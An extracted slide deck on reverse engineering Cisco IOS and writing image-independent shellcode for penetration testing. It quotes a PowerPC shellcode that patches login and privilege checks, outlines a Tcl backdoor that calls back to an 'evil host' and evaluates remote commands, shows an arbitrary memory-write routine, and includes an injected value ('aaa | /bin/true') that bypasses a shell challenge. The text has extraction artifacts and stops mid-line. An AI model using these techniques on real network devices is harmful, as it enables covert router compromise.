{
    "id": "7c63e781-3845-436e-86df-665ddbe04396",
    "created_at": "2022-10-25T16:48:12.632507Z",
    "updated_at": "2025-03-27T02:16:59.16571Z",
    "deleted_at": null,
    "sha1_hash": "85606536882806ab2d4a1a487a70cbcb976d8fcf",
    "title": "",
    "authors": "",
    "file_creation_date": "2015-12-04T13:23:46Z",
    "file_modification_date": "2015-12-04T13:23:46Z",
    "file_size": 9024605,
    "plain_text": "##### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n###### George Nosenko gnosenko@dsec.ru\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n George Nosenko\n\n • Security researcher at Digital Security\n\n • Bug Hunter\n\n • Exploit Developer\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Agenda\n\n Part 1: Cisco IOS Reverse Engineering Part 2: Cisco IOS Shellcoding\n\n • Main Problem • MoEvaEon\n\n • Subsystem • Main Problems\n • Registry • Image-independet Shellcodes\n\n • Processes § Disassembling Shellcode\n\n • Glue Code / Simple Code / Dead Code § Interrupt-Hijack Shellcode\n • Command Parser • Tcl Shellcode\n\n • Where is libc? § How does it work? \n • Other § Features\n\n • How to debug Cisco IOS § LimitaEons\n\n • How to debug Cisco IOS XE § How is it made?\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Prior works\n\n AUacking Network Embedded System Felix ‘FX’ Lindner 2002 The Holy Grail Cisco IOS Shellcode And ExploitaEon Techniques Michael Lynn 2005\n Cisco IOS Shellcodes Gyan Chawdhary, Varun Uppal 2007\n Remote Cisco IOS FTP Exploit Andy Davis 2007 Killing the myth of Cisco IOS rootkits: DIK SebasEan Muniz 2008 Cisco IOS - AUack & Defense. The State of the Art Felix ’FX’ Lindner 2008\n Router ExploitaEon Felix ’FX’ Lindner 2009 Fuzzing and Debugging Cisco IOS SebasEan Muniz, Alfredo Ortega 2011 Killing the Myth of Cisco IOS Diversity Ang Cui, JaEn Kataria, Salvatore J. Stolfo\n 2011 Research on Cisco IOS Security Mechanisms Xiaoyan Sua 2011\n Cisco IOS Rootkits and Malware Jason Nehrboss 2012 SYNful Knock A CISCO IMPLANT Bill Hau, Tony Lee, Josh Homan 2015\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Cisco Diversity Overview\n\n OperaEon Systems\n\n Cisco IOS\n\n Cisco IOS XE (based on Linux)\n\n Cisco NX-OS (based on Linux)\n\n Cisco IOS XR (based on QNX)\n\n ASA OS (based on Linux)\n\n CatOS\n\n Architectures\n\n PowerPC (Book-E)\n\n MIPS\n\n### Over 300 000 unique images\n###### Intel x86_x64\n Killing the Myth of Cisco IOS Diversity\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Part 1\n\n## CISCO IOS RE\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Main problem\n\n • Designed as a single unit - a large, staEcally linked ELF binary\n • Everything is highly integrated and non-modular\n\n • There is no API\n\n#### Image size ≈ 142 MB\n FuncEons ≈ 350 000 IDA Database ≈ 2.5 GB\n Binwalk ≈ 100 GB\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Reverse in context\n\n Inside Cisco IOS Sooware Architecture\n Vijay Bollapragada, CCIE \n CurEs Murphy, CCIE \n Russ White, CCIE\n Cisco IOS Programmer’s Guide Architecture Reference\n Sooware Release 12.0\n Fioh EdiEon February 1999\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Unpacking Firmware\n\n • The image may be self-decompressing\n • The image may contain:\n § loader § driver for flash § firmware for addiEonal hardware § cerEficates\n\n • Binwalk will work successfully, but it generates a large output\n • To automate the analysis, you need to write an unpacker\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Trace strings\n\n Trace strings\n\n FuncEon names\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Trace strings\n\n def rename_funcs(strings=None, paUern=None):\n   names = [s for s in strings if re.search(paUern, str(s)) is not None]\n for name in names:   for ref in DataRefsTo(name.ea):       old_name = GetFuncEonName(ref)       func_addr = LocByNameEx(ref, old_name)\n if func_addr == BADADDR or has_user_name(getFlags(func_addr)): break\n MakeName( func_addr, str(name))\n break\n if __name__ == \"__main__\": rename_funcs(strings=Strings(), paUern=r'^[a-z]{3,}_[a-z]+_')\n# ≈ 8.5%\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Subsystems\n\n**Router# show subsys ?** `struct subsystype_`\nclass  Show subsystems by class `{`\nmemory  Show subsystems memory usage\n```\n                                         unsigned int magic1;\n```\nname   Show subsystems by name\n```\n                                         unsigned int magic2;\n```\nrunning Show subsystem information about running processes\n|    Output modifiers `unsigned int header_version;`\n<cr> `unsigned int kernel_majversion;`\n```\n                                         unsigned int kernel_minversion;\n\n```\n**Router# show subsys** `char*    namestring;`\n```\n                                         unsigned int subsys_majversion;\n\n```\nName        Class   Version\n```\n                                         unsigned int subsys_minversion;\n```\ncef         Kernel   1.000.000\nhw_api_trace_chain Kernel   1.000.001 `unsigned int subsys_editversion;`\nmtrie        Kernel   2.000.001 `void*    init_address;`\nadj_trace_chain   Kernel   1.000.001 `SUBSYSTEM_CLASS class;`\nalarm        Kernel   1.000.001\n```\n                                         unsigned int  id;\n```\narp         Kernel   1.000.001\n```\n                                         char*    properties[SUBSYS_MAX];\n```\narp_app_data    Kernel   1.000.001\n```\n                                        };\n```\n...\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Subsystems\n\n##### All data relaEng to a subsystem is located below the header\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Subsystems\n\n def create_subsytems(name='subsystype_'): for seg in get_data_segment(): for ea in search(start=seg.startEA, end=seg.endEA, paUern='C1 5C 05 15 C1 5C 05 15'): # it uses FindBinary\n       p_name, p_func, sysclass = Dword(ea + 0x14), Dword(ea + 0x24), Dword(ea + 0x28)\n SetColor(p_func, CIC_FUNC, get_color_by_subsysclass(sysclass))\n       func_name = GetString(p_name) if func_name == '': conEnue\n if not has_user_name(getFlags(p_func)): print \"ea: 0x%x 0x%x %s\" % (ea, p_func, func_name) MakeNameAuto(p_func, func_name + '_subsys_init', SN_NOCHECK)\n\n\n-----\n\n###### • 8-12 different types 0x06B42A88\n\n0x04D24970\n0x06747680\n0x06A0CB50\n...\nCDP /  54 : Loop   list[005]\n0x06A859CC\n0x08CA07F0 ≈ 7.4%\n0x087AC228\n\n###### [REG_NAME][NUM_SERVICE][TYPE](SUB)[ADDR] 0x07EF5CE8\n\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Registries and Services\n\nRouter# show registry\n--------------------------------------------\n\n###### • Linker-independent mechanism  CDP      CDP /  :  96 services 1 : List   list[001]\n\n0x062E6F38\n\n###### • Service is an interface into subsystem ...\n\nCDP /  14 : Case   size[000] list[003] default=0x05B4ED60 return_void\n1 0x046D03BC\n2 0x046D04F4\n\n###### • Registry is a collecEon of services\n\n3 0x046D05D4\nCDP /  15 : Value  size[000] list[000] default=0\n\n###### • Service emulates common C               CDP /  16 : Stub 0x064F9230\n\n...\n\n###### construct (loop, switch, etc.)       CDP /  21 : Stub  0x05B4ED64 return_zero\n\n...\n\n###### • 8-12 different types       CDP /  38 : 0x06B42A88 List   list[004]\n\n0x04D24970\n0x06747680\n0x06A0CB50\n...\nCDP /  54 : Loop   list[005]\n0x06A859CC\n0x08CA07F0 ≈ 7.4%\n0x087AC228\n\n###### [REG_NAME][NUM_SERVICE][TYPE](SUB)[ADDR] 0x07EF5CE8\n\n0x084B034C\n...\nCDP /  57 : Retval  size[000] list[000] default=0x046CB720\n\n...\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Process (is equivalent of a thread)\n\n #include “sched.h” pid_t cfork(forkproc (*padd), long pp, int stack, char *name, int Uynum);\n pid_t process_create(process_t (*padd), char *name, stack_size_t stack, process_priority_t priority); . . .\n result = process_create(bootload, “Boot Load”, LARGE_STACK, PRIO_NORMAL); if (result != NO_PROCESS) {\n process_set_arg_num(result, loading); process_set_Uynum(result, startup_Uynum); }\n\n Router# show processes\n CPU utilization for five seconds: 2%/0%; one minute: 2%; five minutes: 2% PID QTy    PC Runtime (ms)  Invoked  uSecs  Stacks TTY Process 1 Cwe 5B63990     152   11998   1225228/26000 0 Chunk Manager 2 Csp 6DE5568      48   37481    122612/23000 0 Load Meter 3 Mwe 44929A4      12   182631    028740/29000 0 BGP Scheduler 4 Mwe 7A426D8      0     11    025748/26000 0 Retransmission\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Process. How to find a process_create() fast\n\n • Process is an internal structure (similar to PEB)\n • Process is allocated in cfork() at 05B9AFDC\n\n • A cfork () is called in process_create()\n\n Router# show memory processor | include Process\n Address   Bytes   Prev   Next Ref   PrevF  NextF Alloc PC what\n 12474BAC 0000000160 124737F8 12474C78 001 -------- -------- 08DF1798 *Init* 12474C78 0000000160 12474BAC 12474D44 001 -------- -------- 08DF1798 *Init* ... 1247BD18 0000004288 1247B710 1247CE04 001 -------- -------- 0638C148 TTY data 12483A50 0000000688 12483984 12483D2C 001 -------- -------- 05B9AFDC Process ...\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Process\n\n def find_all_proocess(func=None, proc_name_reg='r4'):   ea = func.startEA\n for i, ref in enumerate(CodeRefsTo(ea, True)):     proc_ep, proc_name = get_proc_entry_point(ref), get_proc_name(ref, dest_reg=proc_name_reg)\n if proc_ep is None: conEnue\n if has_dummy_name(GetFlags(proc_ep)): if MakeNameEx(proc_ep, proc_name, SN_NOWARN) == 0: print '[!] %d: MakeName failed ref=0x%x: 0x%x, %s' % (i, ref, proc_ep, proc_name)\n SetColor(proc_ep, CIC_FUNC, COLOR)\n if __name__ == '__main__': find_all_proocess(func=get_func(get_name_ea(BADADDR, 'process_create'))\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Glue Code / Simple Code / Dead Code\n\n.text:041AF174       glue_sub_41AF174__memcpy:\n.text:041AF174\n.text:041AF174 3D 60 08 DF lis    r11, _memcpy@h FindBinary( **7D 69 03 A6 4E 80 04 20 )**\n.text:041AF178 39 6B 5F 24 addi   r11, r11, _memcpy@l\n.text:041AF17C 7D 69 03 A6 mtctr   r11\n.text:041AF180 4E 80 04 20 bctr\n.text:041AF180       # End of function glue_sub_41AF174__memcpy\n\n.text:04110830       get_value_at_wC0011F4_o110:\n.text:04110830 FindBinary( 3D 20 ?? ?? 80 69 ?? ??\n.text:04110830 3D 20 0C 00 lis    r9, off_C0011F4@h **38 63 ?? ?? 4E 80 00 20 )**\n.text:04110834 80 69 11 F4 lwz    r3, off_C0011F4@l(r9)\n.text:04110838 38 63 01 10 addi   r3, r3, 0x110\n.text:0411083C 4E 80 00 20 blr\n.text:0411083C       # End of function get_value_at_wC0011F4_o110\n\n###### FindBinary( 38 60 00 01 4E 80 00 20 )\n\n.text:0412E5FC       return_one:\n.text:0412E5FC 38 60 00 01 li    r3, 1\n.text:0412E600 4E 80 00 20 blr\n.text:0412E600       # End of function return_one\n\n# ≈ 19%\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Command Parser Tree\n\n • Located under the subsystem header struct tree_node\n```\n                              {\n tree_node*  right; type = 0x56\n\n • Node contains different informaEon  tree_node*  left;\n payload = 0x1A1A1A1A\n depending on the type unsigned int type;\n                                payload*   data;\n                                unsigned int unknown;\n                                               struct payload_cmd\n\n • The root node has type = 0x56\n                              }; {\n                                                 char* name;\n\n type = 0x45 char* description;\n                                                 ...\n                                                 permission priv;\n                                                 ...\n                                               };\n                              struct payload_handler\n                              {\n                                 void* handler;\n\n void* arg; type = 0x1A\n                                 ...\n                              };\n\n```\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Where is libc?\n\n • In my case, libc is located at end of the code in .text\n\n • libc is a layer over OS service \n (prinƒ, fopen, socket, malloc…)\n\n • libc is a collecEon of base funcEons    (memcpy, strcpy, stncat…)\n\n • A base funcEon is a simple code i.e. \n has a liUle cycloma6c complexity\n\n##### Look for all simple funcEons around the end of the code\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Magic People, Voodoo People!\n\n Process Image/Boot/Code signing\n 0xBEEFCAFE - Process Block 0xFEEDFACE - Envelope header\n 0xBAD00B1E - Flash Driver (atafslib)\n Memory 0xBEEFCAFE - Key Record Info\n\n 0xAB1234CD - Heap Block 0xFD0110DF - Red Zone 0xDEADB10B - Pool 0xAFACEFAD - Packet\n Other\n\n 0x1A1A1A1A - Parser Root Node 0xABABABAB - TCP socket (TCB)  0xDEADCODE - Invalid interrupt handler\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Cisco Discovery\n\nRouter# show processes ? Router# show stack 1\ncpu   Show CPU use per process Process 1: Chunk Manager\nmemory Show memory use per process Stack segment 0x1247D30C - 0x1248389C\n\nFP: 0x12483860, RA: 0x5B9CBFC\nFP: 0x12483888, RA: 0x5B63994\n\nRouter# show memory ?\nallocating-process Show allocating process name FP: 0x12483890, RA: 0x6DEEFA0\nio         IO memory stats FP: 0x0, RA: 0x6DE8834\nprocessor      Processor memory stats\nsummary       Summary of memory usage per alloc PC\n\nRouter# show tcp brief all\n\ntransient TCB    Local Address  Foreign Address (state)\n\n57B455EC 0.0.0.0.64999  *.*        LISTEN\n\nRouter# show buffers all ? 56FAD21C 0.0.0.0.34154  *.*        LISTEN\ndump  Show buffer header and all data\nheader Show buffer header only Router# show ip sockets\npacket Show buffer header and packet data\npool  Buffers in a specified pool\n\nRouter# show version\nRouter# show tech-support\n\nRouter# show list Router# show inventory\nList Manager:\n\nRouter# show module\n\n10944 lists known, 5907113 lists created\nID  Address Size/Max  Name\n\nRouter# show region\n\n1  FA7CA30  10/-   Region List\n\nRouter# show module\n\n2  E9C9560   1/-   I/O Router# show platform hardware tlb\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Debugging under Cisco IOS\n\n • Cisco IOS contains a GDB server, but…\n\nRouter> enable\nRouter# gdb kernel\n\n###### • It doesn’t work with a generic GDB client L\n because the RSP protocol is a liUle different \n\n • You can:\n use ROMMON;  patch old GDB;  use IODIDE;  create an adapter for IDA Pro.\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Debugging under Cisco IOS XE (3.3.5SE)\n\n • Cisco IOS doesn’t contain a GDB server, but…\n • You can build (staEc) gdbserver and GDB for target plaƒorm\n • Then copy gdbserver to device and get Linux Shell\n\nSwitch> enable\nSwitch# configure terminal\nSwitch(config)# service internal\nSwitch(config)# end\nSwitch# request system shell\nActivity within this shell can jeopardize the functioning of the system.\nAre you sure you want to continue? [y/n] Y\nChallenge:e2a41a61930e92d5da…\nPlease enter the shell access response based on the above challenge…\naaa | /bin/true\n\n[Switch:/]$ uname -a\nLinux Switch 2.6.32.59-cavium-octeon2.cge-cavium-octeon… mips64 GNU/Linux\n\n###### • AUach gdbserver to process “iosd” \n (flash:/ map at /mnt/sd3/user)\n\n[Switch:/mnt/sd3/user/gdbservers]$ ./gdbserver.mips /dev/ttyS0 --attach 8566\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Part 2\n\n## CISCO SHELLCODING\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Motivation\n\n Our pentesters ooen deal with Cisco equipment, parEcularly with binary vulnerabiliEes\n\n In public, there is no shellcode for the needs of pentesters\n\n We need a flexible and powerful tool\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Main problems / Earlier shellcode Tiny shellcode by Gyan Chawdhary\n```\n                                                .equ ret,  0x804a42e8 # hardcode\n\n • There is no open API or syscall’s for a third party developer. .equ login, 0x8359b1f4 # hardcode\n                                                .equ god,  0xff100000\n System calls are the interface into ROMMON \n                                                .equ priv, 0x8359be64 # hardcode\n § put char in console\n                                                main: § reboot\n                                                      # login patch begin § change confreg, etc  lis 9, login@ha\n                                                      la 9, login@l(9)\n                                                      li 8,0\n                                                      stw 8, 0(9)\n\n • Cisco IOS Binary Diversity # login patch end\n                                                      # priv patch begin\n\n • Cisco IOS is highly integrated (staEc linked) one big ELF  lis 9, priv@ha\n                                                      la 9, priv@l(9)\n without any modules (e.g. *.so)  lis 8, god@ha\n                                                      la 8, god@l(8)\n                                                      stw 8, 0(9)\n                                                      # priv patch end \n\n Cisco IOS Bind shellcode by Varun Uppal\n                                                      # exit code Cisco IOS Connectback shellcode by Gyan Chawdhary    lis   10, ret@ha Cisco IOS Shellcodes – BlackHat USA 2008    addi  4, 10, ret@l\n                                                    mtctr 4\n\n```\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Image-independent shellcodes\n\n 1. Signature-based Shellcode by Andy Davis - Version-independent IOS shellcode, 2008\n Invariant is a structure of code\n\n 2. Disassembling Shellcode by Felix ‘FX’ Lindner - Cisco IOS Router ExplotaEon, 2009\n Invariant is an unique string\n\n 3. Interrupt-Hijack Shellcode by Columbia University NY - Killing the Myth of Cisco IOS Diversity, 2011\n Invariant is an interrupt handler rouEnes\n\n All leverage a common Cisco IOS invariant to overcome a binary diversity\n\n\n-----\n\n|Col1|.text|\n|---|---|\n|||\n||.data|\n|||\n\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Disassembling Shellcode\n\n Basic technique .text 1. Find a unique string to determine its address\n\n 2. Look for a code which references this string 3. Patch the funcEon\n\n Pros & Cons\n\n • Reliable - it works on a wide range of Cisco equipment\n • Full interacEon, but it is not a covert\n\n • We have to be constrained by only IOS shell .data\n • May cause watchdog Emer excepEons to be thrown, which terminates and logs all long running processes\n\n Cisco IOS Router ExplotaEon, 2009 Killing the Myth of Cisco IOS Diversity, 2011\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Interrupt-Hijack Shellcode\n\n Two-stage aUack Stage 1: 1. Unpack the second-stage shellcode\n 2. Locate ERET instrucEon  3. Intercept all interrupt handlers\n\n Stage 2: 1. Receive command by looking for incoming packets with \n specific format Stage 1 2. Execute command\n\n Pros & Cons\n\n • Fast, Stealth, High Privilege\n\n • Create a hidden channel over ICMP\n\n • It has a complex structure, it operates asynchronously\n\n • It presupposes a database containing the image-dependent payload to stage 3\n\n • Rootkit-oriented\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Interesting fact about SYNful Knock\n\n It seems that the SYNful Knock implant works in a similar way as the Interrupt-Hijack shellcode does\n\n FireEye: SYNful Knock A CISCO IMPLANT\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Requirements to our shellcode\n\n • Image and CPU architecture should be independent\n • Works on a wide range of Cisco equipment\n\n • Pentest-oriented\n • The most powerful and flexible\n\n • So fast that not to be caught by a watchdog\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n## Demo 0x01\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Tool Command Language\n\n • Invented by John K. Ousterhout, Berkeley, 1980s\n hUp://www.tcl.tk\n\n • Interpreted Language, runEme available for many\n plaƒorms (socket, files, regexp, list, etc.)\n\n • Tcl has been included in Cisco IOS as a generic\n scripEng language since 2003 (Release 12.3(2)T)\n • In IOS, Tcl is extended by special commands:\n\n § exec - executes an IOS shell command § ios_config - changes configuraEon\n\n § typeahead - emulates a user input\n\n § etc.\n Cisco Feature Navigator\n\n • Tcl Policy for Embedded Event Manager (EEM)\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Tcl and Pentesting\n\n • Almost the only way to extend the funcEonality of Cisco IOS\n • Tcl scripts are portable between different plaƒorms\n\n Backdoors More Ideas (TwiUer as CC, Bot, Flood, Exploit)\n CreaEng Backdoors in Cisco IOS using Tcl\n AUacking with Cisco devices PH-Neutral 2009 AUacking with Cisco devices Hashdays 2010\n Tools\n AUacking with Cisco devices HSLU 2011\n IOSMap: TCP and UDP Port Scanning on Cisco IOS Plaƒorms\n Cisco Support Community/EMM ScripEng\n IOScat - a Port of Netcat's TCP funcEons to Cisco IOS\n Malware Shellcode\n IOSTrojan: Who really owns your router? Felix ‘FX’ Lindner first proposed the use of Tcl in Cisco IOS Rootkits and Malware (Hakin9 Vol2 No4) the shellcode Cisco IOS Router ExplotaEon\n\n\n-----\n\n|Col1|.text shellcode script Tcl_Iterp|\n|---|---|\n|||\n|||\n\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Tcl Shellcode. How does it work?\n\n Stage 1\n 1. Determine the memory layout .text\n\n 2. Look for the Tcl subsystem in .data shellcode\n callback server\n 3. Find a Tcl C API table within this subsystem script Tcl listen TCP(1337)\n 4. Determine addresses of all handlers for Tcl IOS \n command extension\n\n 5. Create new Tcl commands\n Tcl_Iterp\n 6. Create new Tcl Interpreter by using Tcl C API Txt 7. Run a Tcl script from memory \n (script is integrated in shellcode)\n evil host\n Stage 2\n 1. Script connects to the “callback” server\n cisco router\n 2. Evaluate any Tcl expression received from the server\n\n\n-----\n\n|Col1|.text shellcode script Tcl_Iterp|\n|---|---|\n|||\n|||\n\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Tcl Shellcode. How does it work?\n\n Stage 1\n 1. Determine the memory layout .text\n\n 2. Look for the Tcl subsystem in .data shellcode\n callback server\n 3. Find a Tcl C API table within this subsystem script Tcl listen TCP(1337)\n 4. Determine addresses of all handlers for Tcl IOS \n command extension\n\n 5. Create new Tcl commands\n Tcl_Iterp\n 6. Create new Tcl Interpreter by using Tcl C API Txt 7. Run a Tcl script from memory \n (script is integrated in shellcode)\n evil host\n Stage 2\n 1. Script connects to the “callback” server\n cisco router\n 2. Evaluate any Tcl expression received from the server\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Determine the memory layout\n\n MoEvaEon\n\n • To reduce the search Eme  • Have to use the System Purpose Registers (SPR)\n\n • Not to cause an access violaEon • This method depends on the processor architecture\n\n • We can skip this step\n • Because our shellcode is developed in C, it's not a big problem\n\n Router# show platform hardware tlb\n Virt Address range    Phy Address range    W-I-M-G-E-S Attr TS ESEL ============================================================================ 0xFF000000-0xFFFFFFFF  0x0_FF000000-0x0_FFFFFFFF 1-1-0-1-0-0 RWX 0 (0) . . . 0x04000000-0x07FFFFFF  0x0_04000000-0x0_07FFFFFF 0-0-1-0-0-0 RWX 0 (5) 0x08000000-0x0BFFFFFF  0x0_08000000-0x0_0BFFFFFF 0-0-1-0-0-0 R-X 0 (6) 0x0C000000-0x0FFFFFFF 0x0_0C000000-0x0_0FFFFFFF 0-0-1-0-0-0 RW- 0 (7)\n\n\n-----\n\n|Col1|.text shellcode script Tcl_Iterp|\n|---|---|\n|||\n|||\n\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Tcl Shellcode. How does it work?\n\n Stage 1\n 1. Determine the memory layout .text\n\n 2. Look for the Tcl subsystem in .data shellcode\n callback server\n 3. Find a Tcl C API table within this subsystem script Tcl listen TCP(1337)\n 4. Determine addresses of all handlers for Tcl IOS \n command extension\n\n 5. Create new Tcl commands\n Tcl_Iterp\n 6. Create new Tcl Interpreter by using Tcl C API Txt 7. Run a Tcl script from memory \n (script is integrated in shellcode)\n evil host\n Stage 2\n 1. Script connects to the “callback” server\n cisco router\n 2. Evaluate any Tcl expression received from the server\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Looking for the Tcl subsystem\n\n MoEvaEon\n • To reduce the search Eme\n\n • All data relaEng to the Tcl subsystem is located below the header\n • All funcEons relaEng the Tcl subsystem is located within tcl_subsys_init\n\n • Locate all subsystems by signature C15C0515 C15C0515 \n • Find the Tcl subsystem by name “tcl”\n\n subsystype_ <0xC15C0515, 0xC15C0515, 1, 0, 0, \"tcl\", 2, 0, 1, tcl_subsys_init, Library, 0, 0, 0> \n\n\n-----\n\n|Col1|.text shellcode script Tcl_Iterp|\n|---|---|\n|||\n|||\n\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Tcl Shellcode. How does it work?\n\n Stage 1\n 1. Determine the memory layout .text\n\n 2. Look for the Tcl subsystem in .data shellcode\n callback server\n 3. Find a Tcl C API table within this subsystem script Tcl listen TCP(1337)\n 4. Determine addresses of all handlers for Tcl IOS \n command extension\n\n 5. Create new Tcl commands\n Tcl_Iterp\n 6. Create new Tcl Interpreter by using Tcl C API Txt 7. Run a Tcl script from memory \n (script is integrated in shellcode)\n evil host\n Stage 2\n 1. Script connects to the “callback” server\n cisco router\n 2. Evaluate any Tcl expression received from the server\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Find Tcl C API Table\n\n Tcl C API #define TCL_STUB_MAGIC 0xFCA3BACF\n\n • used for embedding TclStubs tclStubs =\n { \n\n • used for extending\n TCL_STUB_MAGIC,\n\n • Tcl API\n &tclStubHooks, Tcl_PkgProvideEx, /* 0 */ Tcl_PkgRequireEx, /* 1 */\n\n • To abstract the specifics of the plaƒorm, a\n Tcl_Panic, /* 2 */\n funcEon’s pointer table tclStubs is used\n . . .\n\n • We can get address of tclStubs by looking for the Tcl_CreateCommand, /* 91 */\n signature 0xFCA3BACF Tcl_CreateInterp, /* 94 */\n Tcl_DeleteInterp, /* 110 */ Tcl_Eval, /* 129 */ Tcl_Exit, /* 133 */ . . .\n\n\n-----\n\n|Col1|.text shellcode script Tcl_Iterp|\n|---|---|\n|||\n|||\n\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Tcl Shellcode. How does it work?\n\n Stage 1\n 1. Determine the memory layout .text\n\n 2. Look for the Tcl subsystem in .data shellcode\n callback server\n 3. Find a Tcl C API table within this subsystem script Tcl listen TCP(1337)\n 4. Determine addresses of all handlers for Tcl IOS \n command extension\n\n 5. Create new Tcl commands\n Tcl_Iterp\n 6. Create new Tcl Interpreter by using Tcl C API Txt 7. Run a Tcl script from memory \n (script is integrated in shellcode)\n evil host\n Stage 2\n 1. Script connects to the “callback” server\n cisco router\n 2. Evaluate any Tcl expression received from the server\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Determine address of a handler for an extension\n\n MoEvaEon\n Tcl_Command Tcl_CreateCommand _(\n\n • We want to use the Tcl IOS extensions Tcl_Interp * interp, \n char * cmdName,  dTcl_CmdProc * proc, \n\n • We already have (in tclStubs ) the address of ClientData clientData, \n Tcl_CmdDeleteProc * deleteProc);\n Tcl_CreateCommand\n\n • So, we can locate all the places where it is called\n 3C 80 09 94 lis r4, aIos_config@h # \"ios_config\"\n\n • Then we can get the handler’s address and the  3C A0 05 A7 lis r5, ios_config@ha\n name of extension by disassembling 38 84 12 44 addi r4, r4, aIos_config@l # cmdName\n 38 A5 DF 0C addi r5, r5, ios_config@l # cmdProc 38 C0 00 00 li  r6, 0 # clientData 38 E0 00 00 li  r7, 0 # deleteProc 7F E3 FB 78 mr  r3, r31    # interp 48 01 0F 8D bl  Tcl_CreateCommand\n\n\n-----\n\n|Col1|.text shellcode script Tcl_Iterp|\n|---|---|\n|||\n|||\n\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Tcl Shellcode. How does it work?\n\n Stage 1\n 1. Determine the memory layout .text\n\n 2. Look for the Tcl subsystem in .data shellcode\n callback server\n 3. Find a Tcl C API table within this subsystem script Tcl listen TCP(1337)\n 4. Determine addresses of all handlers for Tcl IOS \n command extension\n\n 5. Create new Tcl commands\n Tcl_Iterp\n 6. Create new Tcl Interpreter by using Tcl C API Txt 7. Run a Tcl script from memory \n (script is integrated in shellcode)\n evil host\n Stage 2\n 1. Script connects to the “callback” server\n cisco router\n 2. Evaluate any Tcl expression received from the server\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Create your own Tcl command\n\n int wmem(void* clientData, void* interp, int argc, char** argv)  // wmem addr value {\n Interp* iPtr = (Interp *) interp;  unsigned int* ptr = NULL; unsigned int value = 0;\n\n if(argc != 3) {   iPtr->stubTable->tcl_AppendResult(interp, \"wrong args\", (char *) NULL); return TCL_ERROR;  } if(iPtr->stubTable->tcl_GetInt(interp, argv[1], &ptr) != TCL_OK) return TCL_ERROR; if(iPtr->stubTable->tcl_GetInt(interp, argv[2], &value) != TCL_OK) return TCL_ERROR;\n\n *ptr = value; // write to an arbitrary address\n\n return TCL_OK; }\n\n\n-----\n\n|Col1|.text shellcode script Tcl_Iterp|\n|---|---|\n|||\n|||\n\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Tcl Shellcode. How does it work?\n\n Stage 1\n 1. Determine the memory layout .text\n\n 2. Look for the Tcl subsystem in .data shellcode\n callback server\n 3. Find a Tcl C API table within this subsystem script Tcl listen TCP(1337)\n 4. Determine addresses of all handlers for Tcl IOS \n command extension\n\n 5. Create new Tcl commands\n Tcl_Iterp\n 6. Create new Tcl Interpreter by using Tcl C API Txt 7. Run a Tcl script from memory \n (script is integrated in shellcode)\n evil host\n Stage 2\n 1. Script connects to the “callback” server\n cisco router\n 2. Evaluate any Tcl expression received from the server\n\n\n-----\n\n###### CISCO IOS SHELLCODE: ALL-IN-ONE\n\n Run Tcl script from memory / Eval^2\n\n void shellcode() { . . . # ./tcl/stage2.tcl\n Tcl_Interp* interp = Tcl_CreateInterp();  Tcl_CmdProc* tcl_exec 